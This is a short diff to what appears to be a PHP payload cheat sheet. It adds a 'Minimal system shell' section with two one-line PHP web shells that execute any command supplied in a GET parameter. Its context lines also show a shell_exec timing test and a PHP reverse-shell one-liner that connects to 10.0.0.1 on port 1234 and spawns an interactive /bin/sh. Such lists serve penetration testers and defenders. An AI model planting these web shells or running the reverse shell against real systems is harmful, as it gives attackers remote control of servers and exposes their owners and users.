@@ -98,6 +98,13 @@ Simple Test
 <?php echo shell_exec("sleep 20") ; ?> 
 ```
 
+Minimal system shell
+```
+<?=`$_GET[1]`?>
+
+<pre> <?=`$_GET[1]`?>
+```
+
 Reverse shell using a socket (cmd version)
 ```
 php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
